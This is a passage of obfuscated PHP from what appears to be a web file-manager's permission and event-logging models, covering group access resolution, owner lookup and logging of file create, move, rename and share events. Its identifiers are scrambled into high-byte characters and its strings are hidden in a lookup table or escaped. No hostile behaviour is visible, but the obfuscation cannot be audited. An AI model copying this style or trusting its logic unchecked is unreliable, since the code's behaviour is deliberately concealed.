$Ü„ñû¾’[$İîüÀı[411]] == SourceModel::TYPE_GROUP; $¤Ú©Ê§¾ = $ÇÖ«úù€ ? $this->groupRootAuth($ğÆå²•š, $Úœ‡á¼À) : !1; if ($¤Ú©Ê§¾ && Model($İîüÀı[498])->authCheckAction($¤Ú©Ê§¾[$İîüÀı[413]], $İîüÀı[1890])) { return $this->groupAuthInfo($¤Ú©Ê§¾, $ğÆå²•š); } $¸Ì£õ®ª = Model($İîüÀı[1352])->parentLevelArray($Ü„ñû¾’[$İîüÀı[511]]); $¸Ì£õ®ª = array_merge(array($Ü„ñû¾’[$İîüÀı[402]]), array_reverse($¸Ì£õ®ª)); $õ¡±† = !1; foreach ($¸Ì£õ®ª as $¾öò½³) { if (!isset($ï•ÂÈã[$¾öò½³])) { continue; } $šÜÒ¥úà = $this->authMake($ï•ÂÈã[$¾öò½³], $Úœ‡á¼À); if ($šÜÒ¥úà[$İîüÀı[467]]) { $õ¡±† = $šÜÒ¥úà; break; } } if (!$ÇÖ«úù€) { return $õ¡±†; } if (!$õ¡±† && $¤Ú©Ê§¾) { $õ¡±† = $this->groupAuthInfo($¤Ú©Ê§¾, $ğÆå²•š); } if (!$õ¡±†) { $õºÅ¨Ï‚ = Model($İîüÀı[512])->getInfo($ğÆå²•š); $öç—‘ûß = explode($İîüÀı[50], trim($õºÅ¨Ï‚[$İîüÀı[511]], $İîüÀı[50])); $öç—‘ûß = array_reverse($öç—‘ûß); foreach ($öç—‘ûß as $éĞ„àØ) { if ($éĞ„àØ == $İîüÀı[198] || $éĞ„àØ == $ûãƒ®™ã) { continue; } $°ºûØÌ€ = $this->groupRootAuth($éĞ„àØ, $Úœ‡á¼À); if (!$°ºûØÌ€) { continue; } $õ¡±† = $this->groupAuthInfo($°ºûØÌ€, $éĞ„àØ); break; } } if (!$õ¡±† || $õ¡±†[$İîüÀı[414]] <= 0) { $„¬ÙÕã« = $this->authDeepCheck($Ü„ñû¾’[$İîüÀı[402]], $Úœ‡á¼À); if ($„¬ÙÕã«) { $õ¡±† = $„¬ÙÕã«; } } return $õ¡±†; } private function userIsRoot($±—‰™± = false) { $ œ®·È˜ =& $_SERVER[şÒÁøÒÄ]; if (!$±—‰™± && _get($GLOBALS, $ œ®·È˜[494])) { return !0; } $ïò‰¼±³ = Model($ œ®·È˜[525])->getInfo($±—‰™±); $ÃˆûÀ­Ê = Model($ œ®·È˜[2070])->listData($ïò‰¼±³[$ œ®·È˜[1561]]); if ($ÃˆûÀ­Ê && $ÃˆûÀ­Ê[$ œ®·È˜[502]][$ œ®·È˜[2071]] == 1) { return !0; } return !1; } private function sourceAuthInfo($˜Õ…î¼Ö) { $œÉ´ƒº† =& $_SERVER[şÒÁøÒÄ]; $­Ëşü»Æ = Model($œÉ´ƒº†[1352]); $…÷ÍûŠ = $­Ëşü»Æ->sourceInfo($˜Õ…î¼Ö); if (!$…÷ÍûŠ) { return !1; } $­Ëşü»Æ->groupPathDisplay($…÷ÍûŠ); $õìñŸ½É = array($…÷ÍûŠ); $õìñŸ½É = $­Ëşü»Æ->_listAppendPath($õìñŸ½É); $…÷ÍûŠ = $õìñŸ½É[0]; $µÙüÙšš = $…÷ÍûŠ[$œÉ´ƒº†[509]]; if (isset($…÷ÍûŠ[$œÉ´ƒº†[517]])) { $˜´ÎıÄÈ = explode($œÉ´ƒº†[8], trim($…÷ÍûŠ[$œÉ´ƒº†[509]], $œÉ´ƒº†[8])); array_shift($˜´ÎıÄÈ); $µÙüÙšš = $…÷ÍûŠ[$œÉ´ƒº†[515]] . $œÉ´ƒº†[2072] . implode($œÉ´ƒº†[8], $˜´ÎıÄÈ); } return array($œÉ´ƒº†[420] => $…÷ÍûŠ[$œÉ´ƒº†[32]], $œÉ´ƒº†[84] => KodIO::make($…÷ÍûŠ[$œÉ´ƒº†[402]]), $œÉ´ƒº†[2073] => $µÙüÙšš); } private function groupAuthInfo($ÇÄ£šÈ—, $ÆÏöŠÙ) { $„äÓîÓô =& $_SERVER[şÒÁøÒÄ]; $è§Éâ¦ˆ = Model($„äÓîÓô[512])->getInfo($ÆÏöŠÙ); return array($„äÓîÓô[2074] => intval($ÇÄ£šÈ—[$„äÓîÓô[413]]), $„äÓîÓô[2058] => $ÇÄ£šÈ—, $„äÓîÓô[2075] => LNG($„äÓîÓô[2076]), $„äÓîÓô[2067] => array($„äÓîÓô[420] => $è§Éâ¦ˆ[$„äÓîÓô[32]], $„äÓîÓô[84] => KodIO::make($è§Éâ¦ˆ[$„äÓîÓô[87]][$„äÓîÓô[402]]), $„äÓîÓô[2073] => $è§Éâ¦ˆ[$„äÓîÓô[516]])); } protected function groupRootAuth($òÜº²í, $¸ôÊ‡ÚÃ = false) { $¦åò€¢ =& $_SERVER[şÒÁøÒÄ]; $¸ôÊ‡ÚÃ = $¸ôÊ‡ÚÃ ? $¸ôÊ‡ÚÃ : USER_ID; $ç³ÖŒıæ = $¸ôÊ‡ÚÃ . $¦åò€¢[2077] . $òÜº²í; static $õÎçÁ‹š = array(); if (isset($õÎçÁ‹š[$ç³ÖŒıæ])) { return $õÎçÁ‹š[$ç³ÖŒıæ]; } $ºÙû•Øç = Model($¦åò€¢[512])->getInfo($òÜº²í); $ú÷Íëˆ = $this->userGroupList($¸ôÊ‡ÚÃ); $“ÄÌÃ‡ = isset($ú÷Íëˆ[$òÜº²í]) ? $ú÷Íëˆ[$òÜº²í][$¦åò€¢[413]] : !1; if ($“ÄÌÃ‡ && Model($¦åò€¢[498])->authCheckAction($“ÄÌÃ‡[$¦åò€¢[413]], $¦åò€¢[1890])) { $õÎçÁ‹š[$ç³ÖŒıæ] = $“ÄÌÃ‡; return $“ÄÌÃ‡; } $¨µ¤ü·ù = $this->sourceAuthSelect($ºÙû•Øç[$¦åò€¢[87]][$¦åò€¢[402]]); $Ïº…Š¦ó = $¨µ¤ü·ù ? $this->authMake($¨µ¤ü·ù, $¸ôÊ‡ÚÃ) : !1; $İ®Ôù¯¡ = $Ïº…Š¦ó ? $Ïº…Š¦ó[$¦åò€¢[467]] : !1; $õÎçÁ‹š[$ç³ÖŒıæ] = $İ®Ôù¯¡ ? $İ®Ôù¯¡ : $“ÄÌÃ‡; return $õÎçÁ‹š[$ç³ÖŒıæ]; } public function authOwnerApply($ú¢õùà) { $èü›Æö’ =& $_SERVER[şÒÁøÒÄ]; if (empty($ú¢õùà[$èü›Æö’[413]]) || isset($ú¢õùà[$èü›Æö’[2078]]) && $ú¢õùà[$èü›Æö’[2078]]) { return $ú¢õùà; } if (AuthModel::authCheckRoot($ú¢õùà[$èü›Æö’[413]][$èü›Æö’[414]])) { return $ú¢õùà; } $ƒñ©¹Úß = Model($èü›Æö’[1352])->parentLevelArray($ú¢õùà[$èü›Æö’[511]]); $ƒñ©¹Úß = array_merge(array($ú¢õùà[$èü›Æö’[402]]), array_reverse($ƒñ©¹Úß)); $¼Öñí› = $this->sourceAuthSelect($ƒñ©¹Úß); $üèÎ‘· = array(); $¯ŸÂÓ Ë = array(); foreach ($¼Öñí› as $‰ Æ¢­ => $ÄíÃƒ¼Ü) { $–£í¼Ã¤ = $this->authFolderOwnerUser($ÄíÃƒ¼Ü); $üèÎ‘·[$‰ Æ¢­] = $–£í¼Ã¤; $¯ŸÂÓ Ë = array_merge($¯ŸÂÓ Ë, $–£í¼Ã¤[$èü›Æö’[590]]); if ($–£í¼Ã¤[$èü›Æö’[2079]]) { break; } } if (count($¯ŸÂÓ Ë) == 0) { $¯ŸÂÓ Ë = $this->authFolderOwnerGroup($ú¢õùà[$èü›Æö’[496]]); } $¯ŸÂÓ Ë = array_unique($¯ŸÂÓ Ë); if (AuthModel::authCheckRoot($ú¢õùà[$èü›Æö’[413]][$èü›Æö’[414]])) { $¯ŸÂÓ Ë[] = USER_ID; } $ú¢õùà[$èü›Æö’[413]][$èü›Æö’[2080]] = Model($èü›Æö’[504])->userListInfo($¯ŸÂÓ Ë); return $ú¢õùà; } private function authFolderOwnerGroup($ïêéÌàü) { $ÀŒæ›µ =& $_SERVER[şÒÁøÒÄ]; $ç›¡Ê = Model($ÀŒæ›µ[1959])->where(array($ÀŒæ›µ[1869] => $ïêéÌàü))->select(); $Ÿ÷ºğ…ä = array(); if (!$ç›¡Ê) { return $Ÿ÷ºğ…ä; } foreach ($ç›¡Ê as $şÊŠºí) { $¶·Ÿˆ³º = $this->authInfo($şÊŠºí); if (AuthModel::authCheckRoot($¶·Ÿˆ³º[$ÀŒæ›µ[413]])) { $Ÿ÷ºğ…ä[] = $şÊŠºí[$ÀŒæ›µ[1680]]; } } return $Ÿ÷ºğ…ä; } private function authFolderOwnerUser($Ë·ïÏ©‡) { $ÈÃ×îã =& $_SERVER[şÒÁøÒÄ]; $ÂÆÍöı‡ = array(); $ÖûŞ×£ = !1; foreach ($Ë·ïÏ©‡ as $¨€ŞÍÖ) { $•Õ…©¹œ = $this->authInfo($¨€ŞÍÖ); if ($¨€ŞÍÖ[$ÈÃ×îã[496]] == $ÈÃ×îã[198]) { $ÖûŞ×£ = !0; } if ($¨€ŞÍÖ[$ÈÃ×îã[411]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($•Õ…©¹œ[$ÈÃ×îã[413]])) { $ÂÆÍöı‡[] = $¨€ŞÍÖ[$ÈÃ×îã[496]]; } } } return array($ÈÃ×îã[590] => $ÂÆÍöı‡, $ÈÃ×îã[2079] => $ÖûŞ×£); } public function authMake($„›¹¢§, $œÅ„¼³ = false) { $àãæĞÁ³ =& $_SERVER[şÒÁøÒÄ]; $²ËŒ¡—¼ = $this->authArrayCheck($„›¹¢§, $œÅ„¼³); if ($²ËŒ¡—¼[$àãæĞÁ³[2081]]) { $²ËŒ¡—¼[$àãæĞÁ³[2081]] = $this->sourceAuthInfo($²ËŒ¡—¼[$àãæĞÁ³[2081]]); } return $²ËŒ¡—¼; } public function authArrayCheck($ö½Å«‹, $ŞÄÛßñ = false) { $ÖŸ¼Åˆ =& $_SERVER[şÒÁøÒÄ]; if (!$ö½Å«‹) { return array($ÖŸ¼Åˆ[414] => 0, $ÖŸ¼Åˆ[467] => !1); } $ŞÄÛßñ = $ŞÄÛßñ ? $ŞÄÛßñ : USER_ID; $¼ü½éÛ = 0; $ë„êÄ¨õ = 0; $Õ²Ä”ó’ = 0; $ãÂÉ¸Ñ« = 0; $…ûŠàõ = 0; $²ì°èğÊ = 0; $ˆ»‚æ½Å = 1000; $ø…ÖÀĞ = 0; $–‰Ê«û = 0; $Ã×¸Ç = 0; $˜ë±Ä©„ = 0; $Ã©ìÍ·Š = array($ÖŸ¼Åˆ[402] => 0); foreach ($ö½Å«‹ as $Ã©ìÍ·Š) { $©Èµ³´å = $this->authInfo($Ã©ìÍ·Š); if (!$©Èµ³´å) { continue; } $‚­Å’Õª = $Ã©ìÍ·Š[$ÖŸ¼Åˆ[496]]; $£‹ìÑò = intval($©Èµ³´å[$ÖŸ¼Åˆ[413]]); if ($Ã©ìÍ·Š[$ÖŸ¼Åˆ[411]] == SourceModel::TYPE_USER && $‚­Å’Õª == $ŞÄÛßñ) { $¼ü½éÛ = !0; $Õ²Ä”ó’ = $©Èµ³´å; $ë„êÄ¨õ = $£‹ìÑò; } else { if ($Ã©ìÍ·Š[$ÖŸ¼Åˆ[411]] == SourceModel::TYPE_GROUP && $this->groupContainUser($‚­Å’Õª, $ŞÄÛßñ)) { $ãÂÉ¸Ñ« = !0; $ô‡Ñ‹ï = $this->groupStepToUserGroup($‚­Å’Õª, $ŞÄÛßñ); if ($ô‡Ñ‹ï < $ˆ»‚æ½Å) { $ˆ»‚æ½Å = $ô‡Ñ‹ï; $…ûŠàõ = $£‹ìÑò; $²ì°èğÊ = $©Èµ³´å; $ø…ÖÀĞ = $‚­Å’Õª; } if ($ô‡Ñ‹ï == $ˆ»‚æ½Å && $£‹ìÑò >= $…ûŠàõ) { $…ûŠàõ = $£‹ìÑò; $²ì°èğÊ = $©Èµ³´å; $ø…ÖÀĞ = $‚­Å’Õª; } } else { if ($‚­Å’Õª == $ÖŸ¼Åˆ[198]) { $–‰Ê«û = !0; $˜ë±Ä©„ = $©Èµ³´å; $Ã×¸Ç = $£‹ìÑò; } } } } if ($¼ü½éÛ) { $Â¹Ó¿É÷ = $ë„êÄ¨õ; $©Èµ³´å = $Õ²Ä”ó’; $°éã´‰£ = LNG($ÖŸ¼Åˆ[2082]); } else { if ($ãÂÉ¸Ñ«) { $Â¹Ó¿É÷ = $…ûŠàõ; $©Èµ³´å = $²ì°èğÊ; $ù–›ö‰İ = Model($ÖŸ¼Åˆ[512])->getInfo($ø…ÖÀĞ); $°éã´‰£ = $ÖŸ¼Åˆ[162] . $ù–›ö‰İ[$ÖŸ¼Åˆ[516]] . $ÖŸ¼Åˆ[2083] . LNG($ÖŸ¼Åˆ[2084]); } else { if ($–‰Ê«û) { $Â¹Ó¿É÷ = $Ã×¸Ç; $©Èµ³´å = $˜ë±Ä©„; $°éã´‰£ = LNG($ÖŸ¼Åˆ[2055]); } else { $Â¹Ó¿É÷ = 0; $©Èµ³´å = !1; $°éã´‰£ = $ÖŸ¼Åˆ[12]; } } } $´ÜíÁÑ… = array($ÖŸ¼Åˆ[2074] => intval($Â¹Ó¿É÷), $ÖŸ¼Åˆ[2058] => $©Èµ³´å, $ÖŸ¼Åˆ[2075] => $°éã´‰£, $ÖŸ¼Åˆ[2067] => $Ã©ìÍ·Š[$ÖŸ¼Åˆ[402]]); return $´ÜíÁÑ…; } private function groupContainUser($¥Ãí¬²ô, $´ë Ÿş = false) { return in_array($¥Ãí¬²ô, $this->userGroupParents($´ë Ÿş)); } private function groupStepToUserGroup($ÎÇ˜úšŒ, $òÖ£½İ  = false) { $ŸÄÎïÎç =& $_SERVER[şÒÁøÒÄ]; $½ëÛ¢¯Ö = $this->userGroupList($òÖ£½İ ); $²”ù­£Ğ = 1000; $ª¿à•ûØ = $GLOBALS[$ŸÄÎïÎç[6]][$ŸÄÎïÎç[89]][$ŸÄÎïÎç[1972]] == 1; $Ÿ‘‹€· = $ª¿à•ûØ ? 3 : 2; foreach ($½ëÛ¢¯Ö as $¥…ï‡°) { if ($¥…ï‡°[$ŸÄÎïÎç[1869]] == $ÎÇ˜úšŒ) { return 0; } $Ëö±ÑÎå = explode($ŸÄÎïÎç[50], trim($¥…ï‡°[$ŸÄÎïÎç[511]], $ŸÄÎïÎç[50])); if ($Ëö±ÑÎå[0] == $ŸÄÎïÎç[198] && count($Ëö±ÑÎå) > $Ÿ‘‹€·) { $Â“ÀÖÆ² = array_reverse(array_slice($Ëö±ÑÎå, $Ÿ‘‹€·)); $ÚÒğæÍÃ = array_search($ÎÇ˜úšŒ, $Â“ÀÖÆ²); if ($ÚÒğæÍÃ !== !1 && $ÚÒğæÍÃ + 1 <= $²”ù­£Ğ) { $²”ù­£Ğ = $ÚÒğæÍÃ + 1; } } } return $²”ù­£Ğ; } private function userGroupList($Ã›¾Ÿä’ = false) { $¾çÒ¾‡Ö =& $_SERVER[şÒÁøÒÄ]; static $ï§’“Ú® = array(); if (isset($ï§’“Ú®[$Ã›¾Ÿä’])) { return $ï§’“Ú®[$Ã›¾Ÿä’]; } $ğÙª¨£Û = Model($¾çÒ¾‡Ö[525])->getInfo($Ã›¾Ÿä’); $ï§’“Ú®[$Ã›¾Ÿä’] = array_to_keyvalue($ğÙª¨£Û[$¾çÒ¾‡Ö[2056]], $¾çÒ¾‡Ö[1869]); return $ï§’“Ú®[$Ã›¾Ÿä’]; } public function userGroupParents($Š×Æ‚Ø) { $ëä“òö =& $_SERVER[şÒÁøÒÄ]; static $»ÆÖ’×â = array(); $Š×Æ‚Ø = $Š×Æ‚Ø ? $Š×Æ‚Ø : USER_ID; if (isset($»ÆÖ’×â[$Š×Æ‚Ø])) { return $»ÆÖ’×â[$Š×Æ‚Ø]; } $ÀÖÖ³µÏ = $this->userGroupList($Š×Æ‚Ø); $Ñ‰šÂé = array(); $…ñ¬Ô° = $GLOBALS[$ëä“òö[6]][$ëä“òö[89]][$ëä“òö[1972]] == 1; $ËñöåË„ = $…ñ¬Ô° ? 3 : 2; foreach ($ÀÖÖ³µÏ as $ûÄ¤¡àö) { $É‹íò¦æ = array($ûÄ¤¡àö[$ëä“òö[1869]]); $à“ôÌô = explode($ëä“òö[50], trim($ûÄ¤¡àö[$ëä“òö[511]], $ëä“òö[50])); if ($à“ôÌô[0] == $ëä“òö[198] && count($à“ôÌô) > $ËñöåË„) { $ÄæÛ˜˜  = array_slice($à“ôÌô, $ËñöåË„); $É‹íò¦æ = array_merge($É‹íò¦æ, array_reverse($ÄæÛ˜˜ )); } $Ñ‰šÂé = array_merge($Ñ‰šÂé, $É‹íò¦æ); } $»ÆÖ’×â[$Š×Æ‚Ø] = array_unique($Ñ‰šÂé); return $»ÆÖ’×â[$Š×Æ‚Ø]; } public function authTargetInfoMake($ÜÛÈ©å) { $û­œ†´ =& $_SERVER[şÒÁøÒÄ]; $¯˜Ò˜Û = array(); $±×ïè±° = array(); foreach ($ÜÛÈ©å as $ñ¨·¢¤) { if ($ñ¨·¢¤[$û­œ†´[411]] == SourceModel::TYPE_USER) { $¯˜Ò˜Û[] = intval($ñ¨·¢¤[$û­œ†´[496]]); } else { if ($ñ¨·¢¤[$û­œ†´[411]] == SourceModel::TYPE_GROUP) { $±×ïè±°[] = intval($ñ¨·¢¤[$û­œ†´[496]]); } } } if ($¯˜Ò˜Û) { $¯˜Ò˜Û = Model($û­œ†´[504])->userListInfo($¯˜Ò˜Û); } if ($±×ïè±°) { $…™õ¸¢ = array($û­œ†´[1957] => array($û­œ†´[418], $±×ïè±°)); $±×ïè±° = Model($û­œ†´[512])->field($û­œ†´[2085])->where($…™õ¸¢)->select(); $±×ïè±° = array_to_keyvalue($±×ïè±°, $û­œ†´[1869]); } return array($û­œ†´[2086] => $¯˜Ò˜Û, $û­œ†´[2087] => $±×ïè±°); } public function authInfo($ë“«†¹) { $¾òÎàŠ¬ =& $_SERVER[şÒÁøÒÄ]; if ($ë“«†¹[$¾òÎàŠ¬[1973]]) { $ıÔàõÓ‘ = Model($¾òÎàŠ¬[498])->listData($ë“«†¹[$¾òÎàŠ¬[1973]]); if (!$ıÔàõÓ‘) { return !1; $üîÃ—µ = Model($¾òÎàŠ¬[498])->listData(); $Ñ…Î×‘ = array_filter_by_field($üîÃ—µ, $¾òÎàŠ¬[413], $¾òÎàŠ¬[198]); return $Ñ…Î×‘; } $ßÊ’Š‰… = array_field_key($ıÔàõÓ‘, array($¾òÎàŠ¬[399], $¾òÎàŠ¬[32], $¾òÎàŠ¬[413], $¾òÎàŠ¬[1892], $¾òÎàŠ¬[1893])); $ßÊ’Š‰…[$¾òÎàŠ¬[2088]] = $ë“«†¹; return $ßÊ’Š‰…; } else { return array($¾òÎàŠ¬[419] => 0, $¾òÎàŠ¬[1875] => $ë“«†¹[$¾òÎàŠ¬[2033]], $¾òÎàŠ¬[420] => $¾òÎàŠ¬[12], $¾òÎàŠ¬[1892] => $¾òÎàŠ¬[2089]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\157\137\163\x6f\165\162\x63\x65\137\x65\x76\x65\156\164"; protected $dataAuto = array(array("\x63\162\x65\x61\x74\145\x54\x69\x6d\145", "\164\x69\155\145", "\x69\x6e\163\145\162\164", "\146\x75\x6e\143\x74\x69\157\x6e"), array("\x64\145\163\x63", '', "\x69\x6e\163\x65\x72\164\54\x75\x70\x64\141\164\x65\x2c\163\x65\x6c\x65\x63\x74", "\x6a\163\157\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($¼ª˜¥öÉ, $¼Ç§†”», $»ªÌ…ĞŞ = '') { $¼¦Ö¼  =& $_SERVER[şÒÁøÒÄ]; if (!$this->eventSave) { return; } $œ´ê…ß = Model($¼¦Ö¼ [1352])->sourceInfo($¼ª˜¥öÉ); if (!$œ´ê…ß) { return !1; } if ($this->isCacheEvent($œ´ê…ß, $¼Ç§†”»)) { return; } if ($»ªÌ…ĞŞ && is_string($»ªÌ…ĞŞ)) { $»ªÌ…ĞŞ = array($¼¦Ö¼ [1908] => $»ªÌ…ĞŞ); } $­’¼ú¦¾ = array($¼¦Ö¼ [417] => $¼ª˜¥öÉ, $¼¦Ö¼ [2090] => $œ´ê…ß[$¼¦Ö¼ [432]], $¼¦Ö¼ [2091] => $œ´ê…ß[$¼¦Ö¼ [32]], $¼¦Ö¼ [509] => !empty($œ´ê…ß[$¼¦Ö¼ [509]]) ? $œ´ê…ß[$¼¦Ö¼ [509]] : $¼¦Ö¼ [12], $¼¦Ö¼ [1671] => USER_ID, $¼¦Ö¼ [422] => $¼Ç§†”», $¼¦Ö¼ [1673] => $»ªÌ…ĞŞ); $this->addSystemLog($¼Ç§†”», $­’¼ú¦¾); unset($­’¼ú¦¾[$¼¦Ö¼ [2091]], $­’¼ú¦¾[$¼¦Ö¼ [509]]); return $this->add($­’¼ú¦¾); } private function addSystemLog($¨É•Éú, $ó¥¿™ÁŞ) { $²¦œ”Ì´ =& $_SERVER[şÒÁøÒÄ]; if ($¨É•Éú == $²¦œ”Ì´[2092]) { $¨É•Éú = $ó¥¿™ÁŞ[$²¦œ”Ì´[453]][$²¦œ”Ì´[2093]]; } else { if (in_array($¨É•Éú, array($²¦œ”Ì´[1849], $²¦œ”Ì´[2094]))) { $¨É•Éú = $ó¥¿™ÁŞ[$²¦œ”Ì´[453]][$²¦œ”Ì´[762]]; } } $Ğú ş©œ = array_merge($ó¥¿™ÁŞ, array($²¦œ”Ì´[2095] => $ó¥¿™ÁŞ[$²¦œ”Ì´[402]], $²¦œ”Ì´[2096] => $ó¥¿™ÁŞ[$²¦œ”Ì´[2096]])); Hook::trigger($²¦œ”Ì´[2097], $²¦œ”Ì´[2098] . $¨É•Éú, $ó¥¿™ÁŞ); Model($²¦œ”Ì´[1813])->addLog($²¦œ”Ì´[2098] . $¨É•Éú, $Ğú ş©œ); } private function isCacheEvent($ıï‘…”º, $ô“÷‘êí) { if ($ıï‘…”º[$_SERVER[şÒÁøÒÄ][411]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($×İ±ıØ§, $ËÕÈÄÇ) { $¥ñßæî =& $_SERVER[şÒÁøÒÄ]; $‰‹¾²¯å = Model($¥ñßæî[1352])->sourceInfo($×İ±ıØ§); $éõ­‘ŠÜ = array($¥ñßæî[2093] => $ËÕÈÄÇ, $¥ñßæî[32] => $‰‹¾²¯å[$¥ñßæî[32]]); return $this->addEvent($×İ±ıØ§, $¥ñßæî[2092], $éõ­‘ŠÜ); } public function eventFileEdit($²ˆãœŸ´) { $¨âÃãòÈ =& $_SERVER[şÒÁøÒÄ]; $‰Ê¥á‘Š = array($¨âÃãòÈ[2099] => $_SERVER[$¨âÃãòÈ[2100]], $¨âÃãòÈ[2101] => strtolower(ACTION)); if (isset($GLOBALS[$¨âÃãòÈ[7]][$¨âÃãòÈ[2102]])) { $‰Ê¥á‘Š[$¨âÃãòÈ[2102]] = $¨âÃãòÈ[88]; } return $this->addEvent($²ˆãœŸ´, $¨âÃãòÈ[1839], $‰Ê¥á‘Š); } public function eventRecycle($Ë©Ö˜—İ, $´ş•öï) { return $this->addEvent($Ë©Ö˜—İ, $_SERVER[şÒÁøÒÄ][2094], $´ş•öï); } public function eventRemove($³‚—Íë) { $››ÚÓğü =& $_SERVER[şÒÁøÒÄ]; $Ş§§·İ = Model($››ÚÓğü[1352])->sourceInfo($³‚—Íë); $Ó´ µ¾¶ = $Ş§§·İ[$››ÚÓğü[32]]; return $this->addEvent($Ş§§·İ[$››ÚÓğü[432]], $››ÚÓğü[1838], $Ó´ µ¾¶); } public function eventShare($šÃ¼É¨†, $Âä€íÊ) { return $this->addEvent($šÃ¼É¨†, $_SERVER[şÒÁøÒÄ][1849], $Âä€íÊ); } public function eventMove($şåºÊ, $÷Â½¨Ş, $…Øş‡÷ã) { $½Á œ°è =& $_SERVER[şÒÁøÒÄ]; $É½Â«ÑÅ = Model($½Á œ°è[1352]); $Õ©Şˆ‹õ = $É½Â«ÑÅ->sourceInfo($şåºÊ); $ä Ú¯‹À = $É½Â«ÑÅ->sourceInfo($÷Â½¨Ş); $éÜ¹¢©¡ = $É½Â«ÑÅ->sourceInfo($…Øş‡÷ã); $¥í…§ï¥ = array($½Á œ°è[1173] => $÷Â½¨Ş, $½Á œ°è[2103] => $ä Ú¯‹À[$½Á œ°è[32]], $½Á œ°è[2081] => !empty($ä Ú¯‹À[$½Á œ°è[509]]) ? $ä Ú¯‹À[$½Á œ°è[509]] : $½Á œ°è[12], $½Á œ°è[1174] => $…Øş‡÷ã, $½Á œ°è[2104] => $éÜ¹¢©¡[$½Á œ°è[32]], $½Á œ°è[2105] => !empty($éÜ¹¢©¡[$½Á œ°è[509]]) ? $éÜ¹¢©¡[$½Á œ°è[509]] : $½Á œ°è[12]); $this->addEvent($şåºÊ, $½Á œ°è[548], $¥í…§ï¥); $Õ©Şˆ‹õ = $É½Â«ÑÅ->sourceInfo($şåºÊ); $¥í…§ï¥ = array($½Á œ°è[402] => $Õ©Şˆ‹õ[$½Á œ°è[402]], $½Á œ°è[32] => $Õ©Şˆ‹õ[$½Á œ°è[32]]); $this->addEvent($÷Â½¨Ş, $½Á œ°è[2106], $¥í…§ï¥); } public function eventCopy($ƒëŠÀÃÏ) { $this->eventCreate($ƒëŠÀÃÏ, $_SERVER[şÒÁøÒÄ][546]); } public function eventRename($Çâû×±È, $Çåß÷Ô, $Ä¶†İÏ“) { $íø×î’â =& $_SERVER[şÒÁøÒÄ]; $ƒ¨€©ç© = array($íø×î’â[1173] => $Çåß÷Ô, $íø×î’â[1174] => $Ä¶†İÏ“); return $this->addEvent($Çâû×±È, $íø×î’â[1367], $ƒ¨€©ç©); } public function eventAddComment($ùëë§ß¦, $š‹Ë²µ) { return $this->addEvent($ùëë§ß¦, $_SERVER[şÒÁøÒÄ][2107], $š‹Ë²µ); } public function eventAddDesc($Ãš×¬“û, $¯†üÛÄ) { return $this->addEvent($Ãš×¬“û, $_SERVER[şÒÁøÒÄ][2108], $¯†üÛÄ); } public function listBySource($è½•ø·¸) { $­¸·ßœ¥ =& $_SERVER[şÒÁøÒÄ]; $ô¿êĞåâ = Model($­¸·ßœ¥[1352])->sourceInfo($è½•ø·¸); $úÚâÂÙû = array($­¸·ßœ¥[417] => $è½•ø·¸); if ($ô¿êĞåâ[$­¸·ßœ¥[410]] == $­¸·ßœ¥[88]) { $ƒ—ÉŞÇ” = Model($­¸·ßœ¥[1352])->listSearchChildren($è½•ø·¸, 20000); $ƒ—ÉŞÇ”[] = $è½•ø·¸ . $­¸·ßœ¥[378]; $úÚâÂÙû = array($­¸·ßœ¥[402] => array($­¸·ßœ¥[7], $ƒ—ÉŞÇ”)); } $‡ùÄË®€ = $this->where($úÚâÂÙû)->order($­¸·ßœ¥[2109])->selectPage(); if ($‡ùÄË®€[$­¸·ßœ¥[366]][$­¸·ßœ¥[367]] == 0) { $‡ùÄË®€[$­¸·ßœ¥[366]][$­¸·ßœ¥[367]] = 1; $‡ùÄË®€[$­¸·ßœ¥[369]] = array(array($­¸·ßœ¥[417] => $è½•ø·¸, $­¸·ßœ¥[2090] => $ô¿êĞåâ[$­¸·ßœ¥[432]], $­¸·ßœ¥[1671] => $ô¿êĞåâ[$­¸·ßœ¥[454]], $­¸·ßœ¥[422] => $­¸·ßœ¥[2110], $­¸·ßœ¥[423] => $ô¿êĞåâ[$­¸·ßœ¥[201]], $­¸·ßœ¥[1673] => $­¸·ßœ¥[12])); } return $this->eventListParse($‡ùÄË®€, $è½•ø·¸); } private function eventListParse($×Ò•ËÜ², $²ƒŠî’©) { $Ê—úî©á =& $_SERVER[şÒÁøÒÄ]; $ô»šÊµş = $×Ò•ËÜ²[$Ê—úî©á[369]]; $ÅªöÈ¶ó = array_to_keyvalue($ô»šÊµş, $Ê—úî©á[12], $Ê—úî©á[402]); $„‘³İÆ = array_to_keyvalue($ô»šÊµş, $Ê—úî©á[12], $Ê—úî©á[2096]); foreach ($ô»šÊµş as $ß’‡ï†) { $Àº×ÎÎÂ = $ß’‡ï†[$Ê—úî©á[453]]; if ($ß’‡ï†[$Ê—úî©á[33]] == $Ê—úî©á[548] && isset($Àº×ÎÎÂ[$Ê—úî©á[1173]])) { $ÅªöÈ¶ó[] = $Àº×ÎÎÂ[$Ê—úî©á[1173]] . $Ê—úî©á[12]; $ÅªöÈ¶ó[] = $Àº×ÎÎÂ[$Ê—úî©á[1174]] . $Ê—úî©á[12]; } if ($ß’‡ï†[$Ê—úî©á[33]] == $Ê—úî©á[2106] && isset($Àº×ÎÎÂ[$Ê—úî©á[402]])) { $ÅªöÈ¶ó[] = $Àº×ÎÎÂ[$Ê—úî©á[402]] . $Ê—úî©á[12]; } } $ÅªöÈ¶ó = array_merge($ÅªöÈ¶ó, $„‘³İÆ, array($²ƒŠî’© . $Ê—úî©á[12])); $ÅªöÈ¶ó = array_unique($ÅªöÈ¶ó); $¯˜¶Íå = array_unique(array_to_keyvalue($ô»šÊµş, $Ê—úî©á[12], $Ê—úî©á[1680])); $Áåçâ¬Œ = Model($Ê—úî©á[525])->userListInfo($¯˜¶Íå); $Œ–ªØÓ§ = Model($Ê—úî©á[833])->sourceListInfo($ÅªöÈ¶ó, !0); foreach ($ô»šÊµş as &$ß’‡ï†) { if ($ß’‡ï†[$Ê—úî©á[33]] == $Ê—úî©á[548] && isset($ß’‡ï†[$Ê—úî©á[453]][$Ê—úî©á[1173]])) { $ß’‡ï†[$Ê—úî©á[453]][$Ê—úî©á[1173]] = $Œ–ªØÓ§[$ß’‡ï†[$Ê—úî©á[453]][$Ê—úî©á[1173]]]; 